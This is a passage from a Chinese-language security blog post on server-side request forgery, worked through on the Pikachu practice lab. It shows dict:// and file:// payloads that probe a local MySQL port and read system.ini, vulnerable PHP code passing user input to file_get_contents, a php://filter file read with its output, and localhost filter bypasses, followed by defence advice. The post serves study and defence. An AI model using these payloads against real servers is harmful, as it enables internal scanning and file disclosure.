+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://127.0.0.1:3306</span><br><span class="line">N 5.5.62-log=gnsw|+\��!�n5[KF\&#123;wdo&quot;Umysql_native_password!��#08S01Got packets out of order1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///C:\Windows\system.ini</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220325170713312.png" alt="image-20220325170713312"></p>
+<p><code>curl_init </code> 只能用于 <code>tcp</code>  协议，因此可以用于读取文件或检测端口是否开启</p>
+<h4 id="pikachu-file_get_contents-ssrf"><a class="markdownIt-Anchor" href="#pikachu-file_get_contents-ssrf">#</a> pikachu-file_get_contents ssrf</h4>
+<p><code>file_get_contents</code>  可以接收 <code>php</code>  伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span><br><span class="line">//内网请求:http://x.x.x.x/xx.index</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]) &amp;&amp; $_GET[&#x27;file&#x27;] !=null)&#123;</span><br><span class="line">    $filename = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $str = file_get_contents($filename);</span><br><span class="line">    echo $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=C:\Windows\system.ini</span><br><span class="line">//</span><br><span class="line">OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbMzg2RW5oXQ0Kd29hZm9udD1kb3NhcHAuZm9uDQpFR0E4MFdPQS5GT049RUdBODBXT0EuRk9ODQpFR0E0MFdPQS5GT049RUdBNDBXT0EuRk9ODQpDR0E4MFdPQS5GT049Q0dBODBXT0EuRk9ODQpDR0E0MFdPQS5GT049Q0dBNDBXT0EuRk9ODQoNCltkcml2ZXJzXQ0Kd2F2ZT1tbWRydi5kbGwNCnRpbWVyPXRpbWVyLmRydg0KDQpbbWNpXQ0K</span><br></pre></td></tr></table></figure>
+<h4 id="pikachu-fsockopen-ssrf"><a class="markdownIt-Anchor" href="#pikachu-fsockopen-ssrf">#</a> pikachu-fsockopen ssrf</h4>
+<p>加载远程网站</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=www.baidu.com</span><br></pre></td></tr></table></figure>
+<h3 id="ssrf防御"><a class="markdownIt-Anchor" href="#ssrf防御">#</a> ssrf 防御</h3>
+<ol>
+<li>过滤开头不是<span class="exturl" data-url="aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tLz90PWh0dHAlM0ElMkYlMkZ4eHguY29t"> http://xxx.com</span> 的所有链接，白名单限制 http/https 协议</li>
+<li>过滤格式为 ip 的链接，比如 127.0.0.1</li>
+<li>结尾必须是某个后缀</li>
+</ol>
+<h3 id="绕过"><a class="markdownIt-Anchor" href="#绕过">#</a> 绕过</h3>
+<p><code>http://www.baidu.com@10.10.10.10</code>  与 <code>http://10.10.10.10</code>  请求是相同的</p>
+<p><code>172.16.60.166/curl.php?url=http://wwwbaidu.com@172.16.60.166/curl.php?url=http://www.google.com</code></p>
+<p>绕过 IP 127.0.0.1 过滤</p>
+<p>1. 变形</p>
+<p>http://[::1]<br>
+http://[::ffff:7f00:1]<br>
+http://[::ffff:127.0.0.1]<br>
+<span class="exturl" data-url="aHR0cDovLzEyNy4x">http://127.1</span><br>
+<span class="exturl" data-url="aHR0cDovLzEyNy4wLjE=">http://127.0.1</span><br>
+<span class="exturl" data-url="aHR0cDovLzA6ODA=">http://0:80</span></p>
+<p>2.ip 进制转换</p>
+<p>转为 16 进制，或 10 进制，8 进制</p>
+<p>3.16 进制网址编码</p>
+<p>4.30x 重定向</p>
+<p>防御</p>
+<p>・禁止 302 跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。</p>
+<p>CURLOPT_FOLLOWLOCATION</p>
+<p>・过滤返回信息，验证远程服务器对请求的返回结果，是否合法。</p>
+<p>・禁用高危协议，例如：gopher、dict、ftp、file 等，只允许 http/https</p>
+<p>・设置 URL 白名单或者限制内网 IP</p>
+<p>・限制请求的端口为 http 的常用端口，或者根据业务需要治开放远程调用服务的端口</p>
+<p>・catch 错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务</p>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-11-15 08:32:27" itemprop="dateModified" datetime="2022-11-15T08:32:27+08:00">2022-11-15</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="John Doe Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="John Doe PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2022/06/27/SSRF/" title="SSRF">http://example.com/2022/06/27/SSRF/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/05/27/CSRF/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclx29mstj20zk0m8hdt.jpg" title="CSRF">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> web安全</span>
+  <h3>CSRF</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/08/16/Unserialize/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipey84bjtj20zk0m8hdt.jpg" title="反序列化">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> web安全</span>
+  <h3>反序列化</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf"><span class="toc-number">1.</span> <span class="toc-text"> SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1dict%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.dict 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.2.</span> <span class="toc-text"> gopher 协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.2.</span> <span class="toc-text"> ssrf + Redis 未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8redis%E5%86%99webshell"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 利用 Redis 写 webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%85%AC%E9%92%A5%E7%A7%81%E9%92%A5%E8%8E%B7%E5%8F%96root%E6%9D%83%E9%99%90"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 使用公钥私钥获取 root 权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC"><span class="toc-number">1.2.3.</span> <span class="toc-text"> redis 未授权访问检测脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 利用任务计划反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ssrf%E4%B8%ADcurl%E5%87%BD%E6%95%B0%E8%AF%B7%E6%B1%82redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 利用 ssrf 中 curl 函数请求 Redis 未授权访问</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastcgifpm%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.3.</span> <span class="toc-text"> FastCGI，FPM 未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#iis70%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.</span> <span class="toc-text"> IIS7.0 解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastcgi-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text"> fastcgi 未授权访问</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-2"><span class="toc-number">1.4.</span> <span class="toc-text"> SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu-curl-ssrf"><span class="toc-number">1.4.1.</span> <span class="toc-text"> pikachu - curl ssrf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu-file_get_contents-ssrf"><span class="toc-number">1.4.2.</span> <span class="toc-text"> pikachu-file_get_contents ssrf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pikachu-fsockopen-ssrf"><span class="toc-number">1.4.3.</span> <span class="toc-text"> pikachu-fsockopen ssrf</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E9%98%B2%E5%BE%A1"><span class="toc-number">1.5.</span> <span class="toc-text"> ssrf 防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.</span> <span class="toc-text"> 绕过</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2022/02/17/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li class="active"><a href="/2022/06/27/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li><a href="/2022/08/16/Unserialize/" rel="bookmark" title="反序列化">反序列化</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="John Doe"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">John Doe</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">14</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">5</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2022/05/27/CSRF/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2022/08/16/Unserialize/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/06/27/SSRF/" title="SSRF">SSRF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/05/27/CSRF/" title="CSRF">CSRF</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/08/16/Unserialize/" title="反序列化">反序列化</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/05/17/include/" title="file include">file include</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/30/%E5%8F%91%E7%8E%B0%E5%B0%8F%E5%8F%AF%E7%88%B1%EF%BC%81/" title="about me">about me</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
+</div>
+
+    <span><a href="/2022/11/01/%E6%B1%87%E7%BC%96/" title="汇编">汇编</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
+</div>
+
+    <span><a href="/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/" title="秋招面试题">秋招面试题</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
+</div>
+
+    <span><a href="/2022/11/01/reverse/" title="逆向">逆向</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%86%85%E7%BD%91/" title="In 内网">内网</a>
+</div>
+
+    <span><a href="/2022/05/27/emergency%20response/" title="应急响应">应急响应</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/06/27/SSRF/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
